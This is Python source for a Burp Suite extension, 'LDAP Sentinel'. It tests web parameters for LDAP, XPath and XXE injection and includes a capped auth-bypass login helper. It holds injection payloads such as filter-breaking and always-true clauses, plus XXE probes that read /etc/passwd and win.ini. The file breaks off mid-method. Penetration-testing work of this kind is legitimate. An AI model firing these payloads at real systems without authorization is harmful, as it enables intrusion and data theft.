# -*- coding: utf-8 -*-
#
# ldap_sentinel.py
# ---------------------------------------------------------------------------
# Created by asad0x0
# ---------------------------------------------------------------------------
# Burp Suite Professional extension that passively monitors in-scope HTTP
# traffic (Proxy history) and actively tests one parameter at a time for
# *LDAP injection* and *XPath injection* using baseline-diff + error-signature
# detection, with a manual, guard-railed Auth-Bypass helper.
#
# It NEVER modifies the original request flowing through Burp. For each in-scope
# response it derives test requests (one parameter injected at a time) and sends
# them through callbacks.makeHttpRequest().
#
# Detection philosophy (low false-positive):
#   1) ERROR-BASED (fast, deterministic):
#        syntax-break payloads  )  (  \   -> a NEW LDAP/XPath parser error that
#        was not already present in the baseline response is execution evidence.
#   2) BOOLEAN-BASED (differential, reflection-immune):
#        a TRUE/FALSE payload pair with identical structure except the clause
#        can/can't match. If TRUE resembles the baseline and FALSE differs on
#        >=2 independent response signals, the filter is injectable. A fresh
#        pair must reproduce the difference (confirmation) before reporting.
#   3) WILDCARD oracle (supporting evidence only, never reported alone).
#
#   XPath runs in parallel with the same boolean/error engine.
#   NO out-of-band, NO license gate in this build. Cookies are never injected.
#
# The Auth-Bypass helper is MANUAL ONLY (right-click a login request). It sends
# a small, capped set of real login attempts behind an in-scope check, a
# confirmation dialog, a max-attempts cap and stop-on-success.
#
# Compatibility: Burp Suite Professional, Jython 2.7 (Python 2 syntax only).
#
# Classes:
#   Config, Utilities, ParameterParser, RequestBuilder, RespModel,
#   InjectionDetector, Logger, ResultRow, ResultsTableModel, VulnRenderer,
#   ExtensionUI, Scanner, AuthBypass, BurpExtender
# ---------------------------------------------------------------------------

import sys
import time
import json
import re
import hashlib
import threading
import Queue
import random
from datetime import datetime

# --- Burp API ---------------------------------------------------------------
from burp import IBurpExtender
from burp import IHttpListener
from burp import IExtensionStateListener
from burp import IContextMenuFactory
from burp import ITab
from burp import IParameter

# --- Java / Swing -----------------------------------------------------------
from java.io import PrintWriter, File
from java.awt import BorderLayout, GridLayout, FlowLayout, Font, Color
from java.awt import Toolkit
from java.awt.datatransfer import StringSelection
from java.awt.event import MouseAdapter, ActionListener
from java.util import ArrayList, Comparator

from javax.swing import (JPanel, JScrollPane, JTable, JCheckBox, JTextField,
                         JLabel, JButton, JSplitPane, JTextArea, JPopupMenu,
                         JMenuItem, JFileChooser, SwingUtilities, BorderFactory,
                         ListSelectionModel, JComboBox, JOptionPane, BoxLayout,
                         JTabbedPane)
from javax.swing.table import (AbstractTableModel, DefaultTableCellRenderer,
                               TableRowSorter)


# ===========================================================================
#  Config
# ===========================================================================
class Config(object):

    def __init__(self):
        self.enabled = True

        # --- request sources ----------------------------------------------
        self.enable_get = True
        self.enable_post = True
        self.enable_json = True
        self.enable_multipart = True
        self.enable_xml = True
        self.enable_logging = True
        self.highlight = True

        # --- placements ----------------------------------------------------
        self.enable_method_swap = False     # test GET params as POST and v.v.
        self.enable_path_injection = False  # inject into a trailing path segment

        # --- vulnerability classes ----------------------------------------
        self.enable_ldap = True
        self.enable_xpath = True

        # --- detection techniques -----------------------------------------
        self.check_error = True      # syntax-break -> new parser error
        self.check_boolean = True    # TRUE/FALSE differential pair
        self.check_wildcard = True   # wildcard-prefix oracle (support only)
        self.dn_context = True       # also try DN-context break ( , = + )

        # test the password field too (confirm-probe) on login-shaped requests
        self.test_password_field = True

        # require a 2nd (fresh-token) confirmation before reporting a boolean hit
        self.require_confirmation = True

        # re-test the same endpoint/param on every reload (bypasses dedup)
        self.retest_duplicates = False

        # --- auth-bypass helper guardrails --------------------------------
        self.ab_require_scope = True
        self.ab_max_attempts = 6
        self.ab_stop_on_success = True

        # custom boolean clause: if set, used as the always-TRUE tail instead
        # of (objectClass=*). Must be a valid filter fragment.
        self.custom_true_clause = ""

        # hide findings that rest on the wildcard oracle alone
        self.hide_wildcard_only = True

        # --- XXE (integrated the same way XPath is: a vulnerability class that
        #     reports into the same findings table with Type="XXE"). Only fires
        #     on XML request bodies. ---------------------------------------
        self.enable_xxe = True
        self.xxe_reflection = True      # internal-entity expansion probe
        self.xxe_error_based = True     # parser error + error-exfil
        self.xxe_file_read = True       # classic in-band file read  (ON)
        self.xxe_xinclude = True        # XInclude text include       (ON)
        self.xxe_oob = False            # external-DTD OOB             (OFF)
        self.xxe_linux_oracle = True    # file:///etc/passwd
        self.xxe_windows_oracle = True  # file:///c:/windows/win.ini
        self.xxe_custom_file = ""       # custom file:// or absolute path
        self.xxe_oob_host = ""          # only used if xxe_oob
        self.xxe_max_leaves = 12        # cap XML leaves tested per request

        # unique low-collision run token, used in false-clause names so a random
        # tail can never coincidentally match real directory data.
        self.canary = "lzx" + "".join(
            random.choice("abcdefghijklmnopqrstuvwxyz0123456789")
            for _ in range(5))

        # --- performance ---------------------------------------------------
        self.max_threads = 4
        self.rate_limit_ms = 150
        # overall active-request cap per (param) across all stages
        self.max_req_per_param = 11

        self.ignore_extensions = [
            ".css", ".js", ".png", ".jpg", ".jpeg", ".gif", ".webp", ".ico",
            ".svg", ".woff", ".woff2", ".ttf", ".otf", ".mp4", ".mp3", ".zip",
            ".pdf", ".exe"
        ]
        self.testable_mimes = ["HTML", "JSON", "XML", "text", "script"]


# ===========================================================================
#  Colours
# ===========================================================================
COLOR_RED = Color(200, 0, 0)        # Certain
COLOR_ORANGE = Color(220, 120, 0)   # Firm
COLOR_YELLOW = Color(200, 170, 0)   # Tentative


def confidence_color(conf):
    return {"Certain": COLOR_RED, "Firm": COLOR_ORANGE,
            "Tentative": COLOR_YELLOW}.get(conf, None)


def confidence_hl(conf):
    return {"Certain": "red", "Firm": "orange",
            "Tentative": "yellow"}.get(conf, "gray")


# ===========================================================================
#  Signatures  (LDAP + XPath backend-error fingerprints)
# ===========================================================================
def _c(p):
    return re.compile(p, re.IGNORECASE)

LDAP_SIGNATURES = [
    (_c(r"javax\.naming\."),                 "Java/JNDI"),
    (_c(r"com\.sun\.jndi\.ldap"),            "Java/JNDI"),
    (_c(r"InvalidSearchFilterException"),    "Java/JNDI"),
    (_c(r"InvalidNameException"),            "Java/JNDI"),
    (_c(r"NamingException"),                 "Java/JNDI"),
    (_c(r"LDAP:\s*error code\s*\d+"),        "LDAP(generic)"),
    (_c(r"ldap_search\(\)"),                 "PHP"),
    (_c(r"ldap_bind\(\)"),                   "PHP"),
    (_c(r"ldap_(?:list|read|modify)\(\)"),   "PHP"),
    (_c(r"Bad\s+search\s+filter"),           "PHP/LDAP"),
    (_c(r"System\.DirectoryServices"),       ".NET"),
    (_c(r"DirectoryServicesCOMException"),   ".NET"),
    (_c(r"The\s+search\s+filter\s+is\s+invalid"), ".NET"),
    (_c(r"python-ldap"),                     "Python"),
    (_c(r"ldap\.FILTER_ERROR"),              "Python"),
    (_c(r"ldap\.(?:INVALID_SYNTAX|SERVER_DOWN)"), "Python"),
    (_c(r"LDAPException"),                   "LDAP(generic)"),
    (_c(r"Invalid\s+DN\s+syntax"),           "LDAP(generic)"),
]

_AD_FINGERPRINT = _c(r"(?:0000208[0-9A-F]|DSID-|data\s+52e|NT_STATUS|"
                     r"Active\s+Directory|sAMAccountName)")
_OPENLDAP_FINGERPRINT = _c(r"(?:OpenLDAP|slapd|olcDatabase)")

XPATH_SIGNATURES = [
    (_c(r"XPathException"),                  "XPath/Java"),
    (_c(r"javax\.xml\.xpath"),               "XPath/Java"),
    (_c(r"Error\s+parsing\s+XPath"),         "XPath"),
    (_c(r"xmlXPathEval"),                    "XPath/libxml"),
    (_c(r"XPathEvalError"),                  "XPath/Python"),
    (_c(r"MS\.Internal\.Xml"),               "XPath/.NET"),
    (_c(r"System\.Xml\.XPath"),              "XPath/.NET"),
    (_c(r"SelectNodes"),                     "XPath/.NET"),
]


def scan_signatures(body_text, sig_list):
    hits = []
    for rgx, backend in sig_list:
        m = rgx.search(body_text)
        if m:
            hits.append((m.group(0), backend))
    return hits


def refine_backend(body_text, default="unknown"):
    if _AD_FINGERPRINT.search(body_text):
        return "ActiveDirectory"
    if _OPENLDAP_FINGERPRINT.search(body_text):
        return "OpenLDAP"
    return default


# ===========================================================================
#  Payload templates  (LDAP + XPath)
# ===========================================================================
# A "template" describes one active probe. Materialised per request with a
# fresh random tail where needed.
#
#   mode = "error"    : single payload; a NEW backend error = hit
#   mode = "boolean"  : a TRUE and FALSE payload; TRUE~base, FALSE!=base = hit
#
# {V} = original parameter value, {R} = fresh random tail, {T} = always-true tail

LDAP_ERROR_PAYLOADS = ["{V})", "{V}(", "{V}\\", "{V}*)("]
LDAP_DN_PAYLOADS = ["{V},", "{V}=", "{V}+"]   # DN-context breaks

XPATH_ERROR_PAYLOADS = ["{V}'", "{V}\"", "{V}']", "{V})"]


def build_templates(cfg):
    """Return ENABLED active-probe templates (concrete payloads built later)."""
    T = []

    def add(vclass, tech, tag, sev, label, extra=None):
        d = {"vclass": vclass, "tech": tech, "tag": tag, "sev": sev,
             "label": label, "id": "%s_%s_%s" % (vclass, tech, tag)}
        if extra:
            d.update(extra)
        T.append(d)

    if cfg.enable_ldap:
        if cfg.check_error:
            for i, p in enumerate(LDAP_ERROR_PAYLOADS):
                add("LDAP", "error", "break%d" % i, 3, "ldap error",
                    {"payload": p})
            if cfg.dn_context:
                for i, p in enumerate(LDAP_DN_PAYLOADS):
                    add("LDAP", "error", "dn%d" % i, 3, "ldap dn-error",
                        {"payload": p, "dn": True})
        if cfg.check_boolean:
            add("LDAP", "boolean", "filter", 4, "ldap boolean")
        if cfg.check_wildcard:
            add("LDAP", "wildcard", "prefix", 2, "ldap wildcard")

    if cfg.enable_xpath:
        if cfg.check_error:
            for i, p in enumerate(XPATH_ERROR_PAYLOADS):
                add("XPath", "error", "break%d" % i, 3, "xpath error",
                    {"payload": p})
        if cfg.check_boolean:
            add("XPath", "boolean", "pred", 4, "xpath boolean")
    return T


def rand_tail(n=6):
    return "zzq" + "".join(random.choice("abcdefghijkmnpqrstuvwxyz")
                           for _ in range(n))


def ldap_true_clause(cfg):
    c = cfg.custom_true_clause.strip()
    return c if c else "objectClass=*"


def materialize_boolean(tmpl, value, cfg):
    """Return (true_payload, false_payload) for a boolean template.

    base_mode='value' closes the filter around the real value; if the value
    yields no rows (e.g. a login), the caller retries with base_mode='wild'.
    """
    r = rand_tail()
    if tmpl["vclass"] == "LDAP":
        true_c = ldap_true_clause(cfg)
        tp = "%s)(%s" % (value, true_c)
        fp = "%s)(objectClass=%s" % (value, r)
        tp_wild = "*)(%s" % true_c
        fp_wild = "*)(objectClass=%s" % r
        return tp, fp, tp_wild, fp_wild
    else:  # XPath
        tp = "%s' or '1'='1" % value
        fp = "%s' or '1'='%d" % (value, random.randint(2, 9))
        tp_wild = "' or '1'='1"
        fp_wild = "' or '1'='%d" % random.randint(2, 9)
        return tp, fp, tp_wild, fp_wild


def materialize_wildcard(value):
    """Return (prefix_true, prefix_false) wildcard-oracle payloads."""
    v = value if value else "a"
    pref = v[:max(1, len(v) // 2)]
    r = rand_tail(4)
    return "%s*" % pref, "%s*" % r


# ===========================================================================
#  Utilities
# ===========================================================================
class Utilities(object):

    def __init__(self, helpers):
        self._helpers = helpers

    def now(self):
        return datetime.now().strftime("%H:%M:%S")

    def get_body_str(self, request, req_info):
        offset = req_info.getBodyOffset()
        full = self._helpers.bytesToString(request)
        return full[offset:]

    def header_value(self, req_info, name):
        name = name.lower()
        for line in req_info.getHeaders():
            if ":" in line:
                k, v = line.split(":", 1)
                if k.strip().lower() == name:
                    return v.strip()
        return ""

    def boundary_from_ctype(self, ctype):
        m = re.search(r'boundary=("?)([^";]+)\1', ctype)
        return m.group(2) if m else None

    def has_ignored_extension(self, url, ignore_list):
        try:
            path = url.getPath().lower()
        except Exception:
            return False
        for ext in ignore_list:
            if path.endswith(ext):
                return True
        return False

    def copy_to_clipboard(self, text):
        try:
            sel = StringSelection(text)
            Toolkit.getDefaultToolkit().getSystemClipboard().setContents(sel, None)
        except Exception:
            pass


# ===========================================================================
#  ParameterParser  (cookies intentionally excluded)
# ===========================================================================
class ParameterParser(object):

    def __init__(self, helpers, utils, config):
        self._helpers = helpers
        self._utils = utils
        self._cfg = config

    def parse(self, request, req_info, method):
        descriptors = []

        for p in req_info.getParameters():
            ptype = p.getType()
            name = p.getName()
            if not name:
                continue
            # cookies are NEVER injected
            if ptype == IParameter.PARAM_URL:
                descriptors.append({"kind": "url", "name": name,
                                    "burp_type": IParameter.PARAM_URL})
            elif ptype == IParameter.PARAM_BODY and method == "POST":
                descriptors.append({"kind": "body", "name": name,
                                    "burp_type": IParameter.PARAM_BODY})

        if method == "POST":
            ctype = self._utils.header_value(req_info, "content-type").lower()
            body = self._utils.get_body_str(request, req_info)
            if "application/json" in ctype and self._cfg.enable_json:
                descriptors.extend(self._parse_json(body))
            elif "xml" in ctype and self._cfg.enable_xml:
                descriptors.extend(self._parse_xml(body))
            elif "multipart/form-data" in ctype and self._cfg.enable_multipart:
                descriptors.extend(self._parse_multipart(ctype, body))
        return descriptors

    def _parse_json(self, body):
        out = []
        try:
            obj = json.loads(body)
        except Exception:
            return out
        for path, _val in self._json_string_leaves(obj, []):
            out.append({"kind": "json", "name": self._path_name(path),
                        "path": path})
        return out

    def _json_string_leaves(self, obj, path):
        results = []
        if isinstance(obj, dict):
            for k, v in obj.items():
                results.extend(self._json_string_leaves(v, path + [k]))
        elif isinstance(obj, list):
            for i, v in enumerate(obj):
                results.extend(self._json_string_leaves(v, path + [i]))
        elif isinstance(obj, basestring):
            results.append((path, obj))
        return results

    def _path_name(self, path):
        return ".".join([str(p) for p in path])

    XML_LEAF = re.compile(r'<([A-Za-z_][\w\.\-:]*)[^>]*>([^<>]*)</\1>')

    def _parse_xml(self, body):
        out = []
        for i, m in enumerate(self.XML_LEAF.finditer(body)):
            out.append({"kind": "xml", "name": m.group(1), "occ": i})
        return out

    def _parse_multipart(self, ctype, body):
        out = []
        boundary = self._utils.boundary_from_ctype(ctype)
        if not boundary:
            return out
        try:
            delim = "--" + boundary
            for part in body.split(delim):
                head = part.split("\r\n\r\n", 1)[0]
                if "filename=" in head:
                    continue
                m = re.search(r'name="([^"]+)"', head)
                if m:
                    out.append({"kind": "multipart", "name": m.group(1),
                                "boundary": boundary})
        except Exception:
            pass
        return out


# ===========================================================================
#  RequestBuilder  (one injected parameter; same mechanics as CMDi Sentinel)
# ===========================================================================
class RequestBuilder(object):

    XML_LEAF = re.compile(r'(<([A-Za-z_][\w\.\-:]*)[^>]*>)([^<>]*)(</\2>)')

    def __init__(self, helpers, utils, config):
        self._helpers = helpers
        self._utils = utils
        self._cfg = config

    def _encode(self, value):
        """URL-encode, but keep a literal %00 in the payload as a real NUL byte
        (so null-byte truncation probes survive instead of becoming %2500)."""
        if "%00" in value:
            return "%00".join(self._helpers.urlEncode(p)
                              for p in value.split("%00"))
        return self._helpers.urlEncode(value)

    def build(self, request, desc, value):
        kind = desc["kind"]
        payload = value
        if kind in ("url", "body"):
            encoded = self._encode(payload)
            param = self._helpers.buildParameter(desc["name"], encoded,
                                                 desc["burp_type"])
            return self._helpers.updateParameter(request, param)

        req_info = self._helpers.analyzeRequest(request)
        headers = req_info.getHeaders()
        body = self._utils.get_body_str(request, req_info)
        if kind == "json":
            new_body = self._inject_json(body, desc["path"], payload)
        elif kind == "xml":
            new_body = self._inject_xml(body, desc["occ"], payload)
        elif kind == "multipart":
            new_body = self._inject_multipart(body, desc["boundary"],
                                              desc["name"], payload)
        else:
            return None
        if new_body is None:
            return None
        return self._helpers.buildHttpMessage(
            headers, self._helpers.stringToBytes(new_body))

    def build_method_swap(self, request, desc, value):
        kind = desc["kind"]
        if kind not in ("url", "body"):
            return None, None
        req_info = self._helpers.analyzeRequest(request)
        headers = [h for h in req_info.getHeaders()]
        if not headers:
            return None, None
        line_parts = headers[0].split(" ")
        if len(line_parts) < 3:
            return None, None
        version = line_parts[-1]
        target = line_parts[1]
        path = target.split("?", 1)[0]
        query = target.split("?", 1)[1] if "?" in target else ""
        body = self._utils.get_body_str(request, req_info)

        if kind == "url":
            injected = self._inject_paramstr(query, desc["name"], value)
            if injected is None:
                return None, None
            new_headers = self._swap_headers(
                headers, "POST " + path + " " + version,
                content_type="application/x-www-form-urlencoded", want_body=True)
            req = self._helpers.buildHttpMessage(
                self._to_jlist(new_headers),
                self._helpers.stringToBytes(injected))
            return req, "POST"
        else:
            injected = self._inject_paramstr(body, desc["name"], value)
            if injected is None:
                return None, None
            new_line = "GET " + path + "?" + injected + " " + version
            new_headers = self._swap_headers(
                headers, new_line, content_type=None, want_body=False)
            req = self._helpers.buildHttpMessage(
                self._to_jlist(new_headers), self._helpers.stringToBytes(""))
            return req, "GET"

    def build_path(self, request, value):
        req_info = self._helpers.analyzeRequest(request)
        headers = [h for h in req_info.getHeaders()]
        if not headers:
            return None
        parts = headers[0].split(" ")
        if len(parts) < 3:
            return None
        method, target, version = parts[0], parts[1], parts[-1]
        path = target.split("?", 1)[0]
        query = ("?" + target.split("?", 1)[1]) if "?" in target else ""
        segment = self._encode(value)
        new_path = (path.rstrip("/") + "/" + segment)
        new_line = method + " " + new_path + query + " " + version
        new_headers = [new_line] + list(headers[1:])
        body = self._utils.get_body_str(request, req_info)
        return self._helpers.buildHttpMessage(
            self._to_jlist(new_headers), self._helpers.stringToBytes(body))

    def _inject_paramstr(self, param_string, target, value):
        if param_string is None:
            return None
        encoded = self._encode(value)
        out, found = [], False
        for pair in param_string.split("&"):
            if pair == "":
                continue
            if "=" in pair:
                k, v = pair.split("=", 1)
            else:
                k, v = pair, ""
            if k == target and not found:
                v = encoded
                found = True
            out.append(k + "=" + v)
        if not found:
            return None
        return "&".join(out)

    def _swap_headers(self, headers, new_request_line, content_type, want_body):
        out = [new_request_line]
        for h in headers[1:]:
            low = h.lower()
            if low.startswith("content-type:") or low.startswith("content-length:"):
                continue
            out.append(h)
        if want_body and content_type:
            out.append("Content-Type: " + content_type)
        return out

    def _to_jlist(self, items):
        jl = ArrayList()
        for it in items:
            jl.add(it)
        return jl

    def _inject_json(self, body, path, payload):
        try:
            obj = json.loads(body)
            cur = obj
            for key in path[:-1]:
                cur = cur[key]
            cur[path[-1]] = payload
            return json.dumps(obj)
        except Exception:
            return None

    def _inject_xml(self, body, occ, payload):
        counter = [0]

        def repl(m):
            idx = counter[0]
            counter[0] += 1
            if idx == occ:
                return m.group(1) + payload + m.group(4)
            return m.group(0)
        try:
            return self.XML_LEAF.sub(repl, body)
        except Exception:
            return None

    def _inject_multipart(self, body, boundary, target, payload):
        try:
            delim = "--" + boundary
            parts = body.split(delim)
            rebuilt = []
            for part in parts:
                head_body = part.split("\r\n\r\n", 1)
                m = re.search(r'name="([^"]+)"', head_body[0])
                if (m and m.group(1) == target and len(head_body) == 2
                        and "filename=" not in head_body[0]):
                    rebuilt.append(head_body[0] + "\r\n\r\n" + payload + "\r\n")
                else:
                    rebuilt.append(part)
            return delim.join(rebuilt)
        except Exception:
            return None


# ===========================================================================
#  RespModel + diff  (multi-signal response fingerprint)
# ===========================================================================
_HEX_TOKEN  = re.compile(r"\b[0-9a-f]{16,}\b", re.IGNORECASE)
_B64_TOKEN  = re.compile(r"\b[A-Za-z0-9+/]{24,}={0,2}\b")
_TIMESTAMP  = re.compile(r"\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}:\d{2}")
_NUM_RUN    = re.compile(r"\d+")
_CSRF_FIELD = re.compile(r'name=["\'][^"\']*(?:csrf|token|nonce|viewstate)'
                         r'[^"\']*["\'][^>]*value=["\'][^"\']*["\']',
                         re.IGNORECASE)

SUCCESS_WORDS = ("welcome", "logout", "sign out", "dashboard", "my account",
                 "signed in", "profile")
FAILURE_WORDS = ("invalid", "incorrect", "failed", "not found", "no results",
                 "denied", "unauthor", "bad credentials", "try again")

_ROW_MARKERS = (re.compile(r"<tr[\s>]", re.IGNORECASE),
                re.compile(r"<li[\s>]", re.IGNORECASE),
                re.compile(r'"(?:results|items|entries|users)"\s*:\s*\[',
                           re.IGNORECASE))


def normalize_body(body_text):
    t = _CSRF_FIELD.sub("CSRF", body_text)
    t = _HEX_TOKEN.sub("H", t)
    t = _B64_TOKEN.sub("B", t)
    t = _TIMESTAMP.sub("TS", t)
    t = _NUM_RUN.sub("N", t)
    return t


def body_hash(body_text):
    norm = normalize_body(body_text)
    try:
        data = norm.encode("utf-8", "replace")
    except Exception:
        data = str(norm)
    return hashlib.md5(data).hexdigest()


def result_count(body_text):
    best = 0
    for rgx in _ROW_MARKERS:
        c = len(rgx.findall(body_text))
        if c > best:
            best = c
    return best


class RespModel(object):
    """Captured signals for one HTTP response (robust to CSRF/timestamps)."""

    def __init__(self, helpers, resp_bytes):
        info = helpers.analyzeResponse(resp_bytes)
        self.status = info.getStatusCode()
        self.body = helpers.bytesToString(resp_bytes)[info.getBodyOffset():]
        self.length = len(self.body)
        self.norm_hash = body_hash(self.body)
        self.rcount = result_count(self.body)
        self.location = ""
        self.set_cookie = False
        for h in info.getHeaders():
            hl = h.lower()
            if hl.startswith("location:"):
                self.location = h[9:].strip()
            elif hl.startswith("set-cookie:") and \
                    re.search(r"(sess|sid|auth|token|jwt)", hl):
                self.set_cookie = True
        bl = self.body.lower()
        self.has_success = any(w in bl for w in SUCCESS_WORDS)
        self.has_failure = any(w in bl for w in FAILURE_WORDS)


def diff_signals(base, other, len_tol=0.05):
    """Return (n_signals_differ, detail_list) between two RespModels."""
    detail = []
    n = 0
    if base.status != other.status:
        n += 1
        detail.append("status %d->%d" % (base.status, other.status))
    tol = max(40, int(base.length * len_tol))
    if abs(base.length - other.length) > tol:
        n += 1
        detail.append("len %d->%d" % (base.length, other.length))
    if base.location != other.location:
        n += 1
        detail.append("location changed")
    if (not base.set_cookie) and other.set_cookie:
        n += 1
        detail.append("session cookie set")
    if base.has_failure and other.has_success and not other.has_failure:
        n += 1
        detail.append("fail->success keywords")
    if base.rcount != other.rcount and (base.rcount or other.rcount):
        n += 1
        detail.append("result-count %d->%d" % (base.rcount, other.rcount))
    return n, detail


def responses_differ(base, other):
    n, detail = diff_signals(base, other)
    return (n >= 2), detail


def responses_similar(a, b):
    n, _ = diff_signals(a, b)
    return n == 0


# ===========================================================================
#  InjectionDetector  (error-signature + boolean-diff)
# ===========================================================================
class InjectionDetector(object):

    def __init__(self, helpers, config):
        self._helpers = helpers
        self._cfg = config

    def body_str(self, response):
        if response is None:
            return ""
        offset = self._helpers.analyzeResponse(response).getBodyOffset()
        return self._helpers.bytesToString(response)[offset:]

    def status_length(self, response):
        if response is None:
            return 0, 0
        info = self._helpers.analyzeResponse(response)
        return info.getStatusCode(), len(response) - info.getBodyOffset()

    def model(self, response):
        if response is None:
            return None
        return RespModel(self._helpers, response)

    def new_error(self, body, baseline_body, vclass, dn=False):
        """Return (evidence, backend) if a NEW backend error appeared vs base."""
        sigs = LDAP_SIGNATURES if vclass == "LDAP" else XPATH_SIGNATURES
        hits = scan_signatures(body, sigs)
        if not hits:
            return None, None
        base_hits = scan_signatures(baseline_body or "", sigs)
        new_hits = [h for h in hits if h not in base_hits]
        if not new_hits:
            return None, None
        # DN-context breaks must produce a DN-specific error to count as DN
        if dn and not re.search(r"Invalid\s+DN\s+syntax|InvalidNameException",
                                body, re.IGNORECASE):
            return None, None
        backend = refine_backend(body, new_hits[0][1]) if vclass == "LDAP" \
            else new_hits[0][1]
        return new_hits[0][0], backend


# ===========================================================================
#  Logger
# ===========================================================================
class Logger(object):

    def __init__(self, stdout_writer, config):
        self._out = stdout_writer
        self._cfg = config
        self._ui = None

    def attach_ui(self, ui):
        self._ui = ui

    def _emit(self, text):
        try:
            self._out.println(text)
        except Exception:
            pass
        if self._ui is not None:
            self._ui.append_log(text)

    def log_test(self, ts, method, url, where, label, status, matched):
        if not self._cfg.enable_logging:
            return
        self._emit("[%s] %s %s | Where: %s | Probe: %s | Match: %s | Status: %s"
                   % (ts, method, url, where, label,
                      "YES" if matched else "NO", status))

    def finding(self, ts, method, url, where, vclass, conf, evidence):
        self._emit("[+] %s %s [%s] %s %s | Where: %s | %s"
                   % (vclass, conf, ts, method, url, where, evidence))

    def info(self, text):
        self._emit("[*] " + text)

    def error(self, where, exc_info=None):
        self._emit("[!] Error in %s: %s" % (where, exc_info[1] if exc_info else "?"))


# ===========================================================================
#  Results table
# ===========================================================================
class ResultRow(object):

    def __init__(self, time_s, method, url, where, vclass, context, confidence,
                 technique, backend, evidence, status, length, request,
                 response, host, port, https, color_val):
        self.time = time_s
        self.method = method
        self.url = url
        self.where = where
        self.vclass = vclass
        self.context = context
        self.confidence = confidence
        self.technique = technique
        self.backend = backend
        self.evidence = evidence
        self.status = status
        self.length = length
        self.request = request
        self.response = response
        self.host = host
        self.port = port
        self.https = https
        self.color_val = color_val
        self.model_index = None


class ResultsTableModel(AbstractTableModel):

    COLUMNS = ["Time", "Method", "URL", "Where", "Type", "Context",
               "Confidence", "Technique", "Backend", "Evidence",
               "Status", "Length"]

    def __init__(self):
        self._rows = []

    def getRowCount(self):
        return len(self._rows)

    def getColumnCount(self):
        return len(self.COLUMNS)

    def getColumnName(self, col):
        return self.COLUMNS[col]

    def getValueAt(self, row, col):
        r = self._rows[row]
        return [r.time, r.method, r.url, r.where, r.vclass, r.context,
                r.confidence, r.technique, r.backend, r.evidence,
                str(r.status), str(r.length)][col]

    def isCellEditable(self, row, col):
        return False

    def add_row(self, result_row):
        self._rows.append(result_row)
        idx = len(self._rows) - 1
        result_row.model_index = idx
        self.fireTableRowsInserted(idx, idx)

    def get_row(self, idx):
        return self._rows[idx]

    def clear(self):
        self._rows = []
        self.fireTableDataChanged()

    def all_rows(self):
        return list(self._rows)


class VulnRenderer(DefaultTableCellRenderer):

    def __init__(self, model):
        self._model = model

    def getTableCellRendererComponent(self, table, value, is_selected,
                                      has_focus, row, column):
        comp = DefaultTableCellRenderer.getTableCellRendererComponent(
            self, table, value, is_selected, has_focus, row, column)
        try:
            r = self._model.get_row(table.convertRowIndexToModel(row))
            if r is not None and r.color_val is not None:
                comp.setBackground(r.color_val)
                comp.setForeground(Color.BLACK if r.color_val == COLOR_YELLOW
                                   else Color.WHITE)
            elif not is_selected:
                comp.setBackground(table.getBackground())
                comp.setForeground(table.getForeground())
        except Exception:
            pass
        return comp


# ===========================================================================
#  ExtensionUI
# ===========================================================================
class ExtensionUI(ITab):
    """Single LDAP Sentinel tab (LDAP + XPath + XXE all report here)."""

    def __init__(self, callbacks, config, logger):
        self._callbacks = callbacks
        self._cfg = config
        self._logger = logger
        self._scanner = None        # wired by BurpExtender
        self.model = ResultsTableModel()
        self._repeater_counter = 0
        self._count_monitored = 0
        self._count_found = 0
        self._build()

    def getTabCaption(self):
        return "LDAP Sentinel"

    def getUiComponent(self):
        return self._root

    def _build(self):
        self._root = JPanel(BorderLayout())
        settings = self._build_settings()

        self.table, scroll, self.sorter = self._make_table(self.model)
        self.log_area = JTextArea()
        self.log_area.setEditable(False)
        self.log_area.setFont(Font("Monospaced", Font.PLAIN, 12))
        log_scroll = JScrollPane(self.log_area)

        split = JSplitPane(JSplitPane.VERTICAL_SPLIT, scroll, log_scroll)
        split.setResizeWeight(0.72)
        self._root.add(split, BorderLayout.CENTER)
        self._root.add(self._build_statusbar(), BorderLayout.SOUTH)
        self._root.add(settings, BorderLayout.NORTH)

    def _make_table(self, model):
        table = JTable(model)
        table.setSelectionMode(ListSelectionModel.MULTIPLE_INTERVAL_SELECTION)
        table.setAutoResizeMode(JTable.AUTO_RESIZE_OFF)
        table.getColumnModel().getColumn(2).setPreferredWidth(320)   # URL
        table.getColumnModel().getColumn(9).setPreferredWidth(240)   # Evidence
        renderer = VulnRenderer(model)
        for i in range(model.getColumnCount()):
            table.getColumnModel().getColumn(i).setCellRenderer(renderer)
        sorter = TableRowSorter(model)
        sorter.setComparator(10, self._IntComparator())  # Status
        sorter.setComparator(11, self._IntComparator())  # Length
        table.setRowSorter(sorter)
        table.addMouseListener(self._TableMouse(self, table, model))
        return table, JScrollPane(table), sorter

    class _IntComparator(Comparator):
        def compare(self, a, b):
            try:
                return cmp(int(a), int(b))
            except Exception:
                return 0

    def _build_statusbar(self):
        bar = JPanel(BorderLayout())
        self.stats_label = JLabel(" Monitored: 0    Found: 0 ")
        legend = JLabel("Legend:  RED = Certain   ORANGE = Firm   "
                        "YELLOW = Tentative     ")
        author = JLabel("LDAP Sentinel  -  created by asad0x0   ")
        author.setFont(Font("SansSerif", Font.BOLD, 12))
        left = JPanel(FlowLayout(FlowLayout.LEFT))
        left.add(self.stats_label)
        left.add(legend)
        bar.add(left, BorderLayout.WEST)
        bar.add(author, BorderLayout.EAST)
        bar.setBorder(BorderFactory.createEmptyBorder(2, 6, 2, 6))
        return bar

    def _refresh_stats(self):
        self.stats_label.setText(" Monitored: %d    Found: %d "
                                 % (self._count_monitored, self._count_found))

    def _build_settings(self):
        panel = JPanel(BorderLayout())
        panel.setBorder(BorderFactory.createTitledBorder(
            "LDAP Sentinel settings  (created by asad0x0)"))

        checks = JPanel(GridLayout(0, 4, 6, 4))
        self.cb_enabled = self._checkbox("Enable Extension", self._cfg.enabled)
        self.cb_get = self._checkbox("Enable GET", self._cfg.enable_get)
        self.cb_post = self._checkbox("Enable POST", self._cfg.enable_post)
        self.cb_json = self._checkbox("Enable JSON", self._cfg.enable_json)
        self.cb_multipart = self._checkbox("Enable Multipart", self._cfg.enable_multipart)
        self.cb_xml = self._checkbox("Enable XML", self._cfg.enable_xml)
        self.cb_logging = self._checkbox("Enable Logging", self._cfg.enable_logging)
        self.cb_highlight = self._checkbox("Highlight Findings", self._cfg.highlight)
        self.cb_swap = self._checkbox("Method Swap GET<->POST", self._cfg.enable_method_swap)
        self.cb_path = self._checkbox("Path Injection", self._cfg.enable_path_injection)
        self.cb_ldap = self._checkbox("LDAP Injection", self._cfg.enable_ldap)
